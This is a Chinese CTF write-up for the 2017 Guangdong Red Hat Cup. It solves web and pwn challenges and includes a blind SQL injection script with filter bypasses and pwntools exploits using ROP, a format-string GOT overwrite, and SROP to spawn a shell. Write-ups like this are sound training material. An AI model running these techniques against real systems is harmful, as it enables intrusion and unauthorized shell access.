# 【CTF 攻略】2017 广东省红帽杯网络安全攻防大赛 Writeup

阅读量 **248623**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-05-08 14:04:41

 **x**

##### 译文声明

本文是翻译文章，文章来源：安全客

译文仅供参考，具体内容表达以及含义原文为准。

****

**作者：[ **Ni9htMar3**](http://bobao.360.cn/member/contribute?uid=2887893216)**

**预估稿费：400RMB**

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**  
**

**赛事介绍**

**2017年第一届“广东省红帽杯网络安全攻防大赛”**
，由广东省公安厅网警总队指导、广东省计算机信息网络安全协会主办，华南理工大学承办，北京永信至诚科技股份有限公司协办。本次比赛的目的是加快高校网络安全学科专业建设，创新网络安全人才培养机制，提升全社会网络安全意识。

本次比赛要求参赛队员具备基本的计算机理论和实践基础。其中涉及到的考试范围包括：安全技能相关逆向、漏洞挖掘与利用、Web渗透、密码、取证、隐写、安全编程等。为了取得较好的成绩，系统学习网络攻防知识，所有参赛选手在赛前均可获得免费的比赛辅导课程，详情请参考[
**参赛手册**](http://www.scut.edu.cn/redhat2017/register/images/guide.docx)。

**  
**

**签到**

扫码按操作即得

  

**brian(Y)**

打开题目，发现是一段字符：

    
    
    +++++ +++++ [->++ +++++ +++<] >++.+ +++++ .<+++ [->-- -<]>- -.+++ +++.<
    ++++[ ->+++ +<]>+ +++.< ++++[ ->--- -<]>- ----- .<+++ +++[- >---- --<]>
    ----- ----- -.+.- ..--- ---.. <++++ +++[- >++++ +++<] >.<++ +++++ [->--    ----- <]>-- -.+++ .++++ ++.<+ +++++ [->++ ++++< ]>+++ +++++ .<+++ +++[-    >---- --<]> ----- ----- .---- ---.+ +++++ +.<++ ++++[ ->+++ +++<] >++++
    +++++ .<+++ +++[- >---- --<]> ----- ----- -.--. ---.< +++++ ++[-> +++++
    ++<]> ++++. <++++ +++[- >---- ---<] >.+++ +.+++ +.<++ +[->- --<]> ---.<
    +++++ ++[-> +++++ ++<]> +++++ +.<++ ++++[ ->--- ---<] >---- ----- --.+.
    -.-.. ---.+ +++.< +++++ +[->+ +++++ <]>++ +++++ ++++. <++++ +++[- >----    ---<] >---. <++++ +++[- >++++ +++<] >++.< +++++ +[->- ----- <]>-- -----    ----- .<+++ +++++ [->++ +++++ +<]>+ +++++ ++++. <

其实我是用解密网站直接搞

奈何队友很坚定的学原理、编程序

将以上文本内容保存为brian(Y).bf

观察可以发现每五个字符为一组，尝试上网搜索几个不同的字符分组后，发现为brainfuck这种编程语言，利用C语言编写的brainfuck解释器，运行代码得到结果。

解释器代码如下：

    
    
    #define LEN 50000
    #include <stdio.h>
    #include <stdlib.h>
    int main(int argc, char **argv)
    {
        FILE *input = fopen(argv[1], "r");
        char source[LEN] = {0};
        char runtime[LEN] = {0};
        char *sptr, *wptr;
        int pos = 0;
        int wflag = 0;
        int line = 1, col = 0, wline, wcol;
        sptr = source;
        while (wflag || EOF!=fscanf(input, "%c", sptr))
        {
            if (!wflag)
                ++col;
            else
                ++wcol;
            switch (*sptr)
            {
                case '>' :
                    ++pos;
                    break;
                case '<' :
                  if (--pos <0)
                  {
                  printf("%d : %d : ERROR: Illegal pointer valuen", line, col);
                        return 1;
                    }
                    break;
                case '+' :
                    ++runtime[pos];
                    if (runtime[pos] < 0 || runtime[pos] > 255)
                    {
                    if (!wflag)
                       printf("%d : %d : ERROR: Illegal valuen", line, col);
                    else
                       printf("%d : %d : ERROR: Illegal valuen", wline, wcol);
                        return 1;
                    }
                    break;
                case '-' :
                    --runtime[pos];
                    if (runtime[pos] < 0 || runtime[pos] > 255)
                    {
                        if (!wflag)
                            printf("%d : %d : ERROR: Illegal valuen", line, col);
                        else
                            printf("%d : %d : ERROR: Illegal valuen", wline, wcol);
                        return 0;
                    }
                    break;
                case '.' :
                    putchar(runtime[pos]);
                    break;
                case ',' :
                    runtime[pos]=getchar();
                    break;
                case '[' :
                    if (runtime[pos])
                        wptr = sptr-1;
                    else
                        wflag = 0;
                    wline = line;
                    wcol = col;
                    break;
                case ']' :
                    sptr = wptr;
                    wflag = 1;
                    line = wline;
                    col = wcol;
                    break;
                case 'n' :
                    if (!wflag)
                    {
                        ++line;
                        col = 0;
                    }
                    else
                    {
                        ++wline;
                        wcol = 0;
                    }
                    break;
            }
            ++sptr;
        }
        fclose(input);
        return 0;
    }

编译后得到exe程序，命令行指令：bf.exe brian(Y).bf

结果如下：

    
    
    flag{e676600a-06b4-4a20-b159-d5654415d0c3}

**WEB**

**刮刮乐**

打开

是.git泄露，直接使用lijiejie脚本

    
    
    flag{027ea8c2-7be2-4cec-aca3-b6ba400759e8}

**PHPMyWIND**

额，一开始做出来，密码是000000还两次md5加密。。。没啥用，后来写wp改密码啦。。。

反正扫描没啥东西，找下它的漏洞，经过一番测试感觉order.php有问题

发现这个漏洞：[http://0day5.com/archives/1442/](http://0day5.com/archives/1442/)

测试吧，加两个cookie先试试能找到点不能，发现订单

可以，按照他的走就行

找到密文解密即可

访问

后台

打开后

用户名admin，密码不知道，但提示是2017和时间，那就是2017XXXX，用burpsuite爆破即可

**thinkseeker**

打开，index.php~找到重要代码

    
    
    <?php
    error_reporting(0);
    $token="e00cf25ad42683b3df678c61f42c6bda";
    foreach($_GET as $key=>$value){ 
        if (is_array($value)){
            die("Bad input!");
        }
        $p="and|union|where|join|sleep|benchmark|if|sleep|benchmark|,| |'|"";
        if(preg_match("/".$p."/is",$value)==1){
            die("inj code!");
        }
    }
    parse_str($_SERVER['QUERY_STRING']);
    if($token==md5("admin")){
        $link=@mysql_connect("XXXX","XXXX","XXXX");
        mysql_select_db("XXXX",$link);
        $sql="select * from user where userid = ".$userid;
        $query = mysql_query($sql);
        if (mysql_num_rows($query) == 1) { 
            $arr = mysql_fetch_array($query);
            if($arr['password'] == $password) {
                $sql="select * from info where infoid=".$infoid;
                $result=mysql_query($sql);
                $arr = mysql_fetch_array($result);
                if(empty($arr['content'])){
                    echo "error sql!";
                }else{
                    echo $arr['content'];
                }
            }else{
                echo "error password!";
            }
        }else{
            echo "error userid!";
        }
        mysql_close($link);
    }else{
        echo "Bad token!";
    }
    ?>
    <html>
        <head>
            <title>web-test</title>
        </head>
        <body>
            <form action="" method="get">
                User ID:<input type="text" name="userid" length="50" /><br>
                Password:<input type="password" name="password" length="50" /><br>
                <input type="submit" value="submit"/>
            </form>
        </body>
    </html>

过滤了非常多的东西，比如空格，,什么的，也不用管，只要select,from,ascii,substr有就可以尝试盲注，不过看代码还是先试一下传参

由于传入的参数没有用引号，所以不用管闭合问题，直接用%0a绕过

token可以直接用admin的md5变量覆盖，然后一开始infoid=1%0aor%0a1=1置真就行，然后由于userid只能有一个值，且由于password不知道原来的，没办法绕过，这样就想到了一个姿势

网址：（<https://raz0r.name/other/phdays-2013-ctf-blade-writeup/> ）

可以用with
rollup，这个是统计组的信息，若没用任何统计函数(sum,avg…)，多出的那一行的password列只能是NULL,所以之后password传参无就可以。

得到了一句提示，猜测是列名表名，先测试一下构造语句

可以知道当后面语句为真的时候返回的是flag is in flag!

脚本

    
    
    import requests
    dic='{}@#123456789abcdefghijklmnopqrstuvwxyzQWERTYUIOPASDFGHJKLZXCVBNM'
    string = ''
    for i in range(1,40):
        for j in dic:
            url = 'http://106.75.117.4:3083/?token=21232f297a57a5a743894a0e4a801fc3&userid=1%0a||%0a1%0agroup%0aby%0apassword%0awith%0arollup%0alimit%0a1%0aoffset%0a1&password=&infoid=1%0a%26%26%0aascii(substr((select%0aflag%0afrom%0aflag)from({0})))={1}'.format(i,ord(j))
            #print url
            s=requests.get(url=url)
            text = s.content
            #print text
            if "flag" in text:
                string += j
                print string
                break
    print string

  

**PWN**

**pwn1**

一个简单的栈溢出，开了nx防护，要用rop，因为32位系统加上pwntools的使用，利用组件rop即可。

    
    
    from pwn import *
    #context.log_level = 'debug'
    binary = ELF('./pwn1')
    p = remote('106.75.93.221',  10000)
    p.recvline()
    rop = ROP(binary)
    rop.call(0x08048410,(0x08048629, 0x0804A040))
    rop.system(0x0804A040)
    payload = str(rop)
    p.sendline('a'*52 + payload )
    p.sendline('/bin/sh')
    p.interactive()

**pwn2**

下载文件后，IDA分析

明显的格式化字符串漏洞。

利用思路：（re2libc）

1.首先，泄漏system的地址，这里我使用pwntools 的 DnyELF

2.然后，将printf函数的GOT表项，覆写为system 的地址，这样再次调用printf时，实际会调用system

3.最后，再次循环执行的时候，利用read 读入，/bin/sh字符串，这样printf('/bin/sh') , 会变成
system('/bin/sh')

EXP：

    
    
    from pwn import *
    #io = process('./pwn2_')
    io =remote('106.75.93.221', 20003)
    elf = ELF('./pwn2_')
    #context.log_level = 'debug'
    def leak(addr):
    payload = 'BB%9$s'
    payload += 'AA'
    payload += p32(addr)
    io.sendline(payload)
    io.recvuntil('BB')
    content = io.recvuntil('AA')
    if(len(content) == 2):
    print '[*] NULL'
    return 'x00'
    else:
    print '[*] %#x ---> %s' % (addr, (content[0:-2] or '').encode('hex'))
    return content[0:-2]
    #-------- leak system
    d = DynELF(leak, elf=ELF('./pwn2_'))
    libc_addr = d.lookup(None, 'libc')
    log.info('libc_addr:' + hex(libc_addr))
    d = DynELF(leak, libc_addr)
    system_addr = d.lookup('system')
    log.info('system_addr:' + hex(system_addr))
    #-------- change GOT
    printf_got = elf.got['printf']
    log.info(hex(printf_got))
    payload = fmtstr_payload(7, {printf_got: system_addr})
    io.sendline(payload)
    payload = '/bin/shx00'
    io.sendline(payload)
    io.interactive()

**pwn4**

必须使用SROP，关于SROP请自行google

思路如下:

需要利用read的返回值条用其他的syscall

需要利用write泄露栈地址

需要利用read将/bin/sh写入到stack一个我们已知的地址中

需要stack pivot到一个我们已知的地址

最后调用execve("/bin/sh")

理清楚劫持程序流后的流程就可以，exp如下:

    
    
    #! python
    from pwn import *
    context.binary = './pwn4'
    io = process('./pwn4')
    io = remote('106.75.66.195', 11006)
    #leak stack addr
    payload = p64(0x4000b0)
    payload += p64(0x4000b3)
    payload += p64(0x4000b0)
    io.sendline(payload)
    io.send('xb3')
    sleep(2)
    LeakMsg = io.recvn(0x400)
    leak_addr = u64(LeakMsg[0x8:0x8+8])
    log.info("leak_addr:"+hex(leak_addr))
    stack_addr = leak_addr-0x500
    log.info("stack_addr:"+hex(stack_addr))
    binsh_addr = stack_addr+0x300
    log.info("binsh_addr:"+hex(binsh_addr))
    #write /bin/sh to stack
    syscall_addr = 0x4000be
    frame = SigreturnFrame()
    frame.rax = constants.SYS_read
    frame.rdi = 0
    frame.rsi = stack_addr
    frame.rdx = 0x400
    frame.rsp = stack_addr
    frame.rip = syscall_addr
    payload1 = p64(0x4000b0)+p64(syscall_addr) #signturn
    payload1 += str(frame)
    io.sendline(payload1)
    sleep(2)
    io.send(payload1[0x8:0x8+15])
    sleep(2)
    #execve("/bin/sh")
    frame = SigreturnFrame()
    frame.rax = constants.SYS_execve
    frame.rdi = binsh_addr
    frame.rip = syscall_addr
    payload2 = p64(0x4000b0)+p64(syscall_addr)
    payload2 += str(frame)
    payload2 += 'a' * (0x300-len(payload2)) + '/bin/shx00'
    io.sendline(payload2)
    sleep(2)
    io.send(payload2[0x8:0x8+15])
    sleep(2)
    io.interactive()

**pwn5**

这题使用了canary防护，但是是送分题，利用报错输出就可以，爆破因为之前已经将flag地址读到程序中还是bss段，直接栈上喷上flag的地址就可以拿到flag。

    
    
    from pwn import *
    context.log_level = 'debug'
    #p = process('./pwns')
    p = remote('106.75.93.221',10003)
    p.recv()
    payload = p32(0x0804A080)*100
    p.sendline(payload)
    p.recv()
    p.recv()

本文翻译自安全客 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Ni9htMar3** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/86038](/post/id/86038)

安全客 - 有思想的安全新媒体

本文转载自: [安全客]()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF通关攻略](/tag/CTF通关攻略)

 **+1** __0赞

 __收藏

![](https://p5.ssl.qhmsg.com/dm/200_200_100/t01a6469bf46f5c113e.jpg) Ni9htMar3

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

